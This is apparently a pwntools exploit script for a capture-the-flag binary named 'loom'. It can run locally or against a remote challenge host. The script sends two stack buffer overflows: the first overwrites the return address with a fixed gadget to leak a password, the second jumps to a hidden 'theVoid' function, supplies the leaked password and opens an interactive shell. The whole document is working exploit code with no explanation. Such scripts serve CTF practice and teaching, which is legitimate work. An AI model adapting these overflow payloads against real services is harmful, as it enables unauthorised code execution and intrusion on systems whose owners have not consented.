# -- coding: utf-8 --
from pwn import *
context.log_level = "debug"
# ENV
PORT = 33616
HOST = "0.cloud.chals.io"
e = context.binary = ELF('./loom')
# lib = ELF('')
lib = e.libc
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = e.process()
    pause()

sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
se = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
ru = lambda x : p.recvuntil(x)
rl = lambda: p.recvline()
rec = lambda x : p.recv(x)

# VARIABLE


# PAYLOAD
ru("leave\n")
sl("1")
ru("Leave\n")
sl("1")
payload = b"a"*280
payload +=  fit(0x40232a)
pause()
sl(payload)
sl("2")
ru("ancient : \n")
rl()
pwd = rl()
print(pwd)

ru("leave\n")
sl("1")
ru("Leave\n")
sl("1")
payload = b"a"*0x98
payload +=  fit(e.sym.theVoid)
pause()
sl(payload)
sl("3")
ru("fates : \n")
se(pwd)
sl("1")


p.interactive()
